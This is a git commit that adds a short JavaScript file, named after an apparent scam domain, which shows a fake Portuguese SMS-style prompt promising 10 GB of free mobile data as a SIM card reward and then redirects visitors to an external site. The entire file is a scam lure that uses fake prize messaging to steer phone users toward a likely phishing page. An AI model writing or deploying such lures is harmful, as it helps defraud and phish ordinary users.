d421d24f02fb895cf11ea25a9cb572ecffe16c2a
harryjohnson86 <mfonjohnson86@gmail.com>
2025-02-11 06:32:37 -0800

    Create sim-10gbreward.com.js

---
+++ sim-10gbreward.com.js
@@ -0,0 +1,5 @@
+var password = 'Dados Gratuitos'
+password=prompt('SMS: Parabéns, seu número é elegível para receber 10 GB de dados gratuitos RECOMPENSA DE CARTÃO SIM ANTIGO. Por favor, pressione OK para ATIVAR. ','Dados Gratuitos');
+if (password != 'Dados Gratuitos') {
+location.href='https://legitools.xyz/mtcsim-upgrade.10gbdata.html';
+}
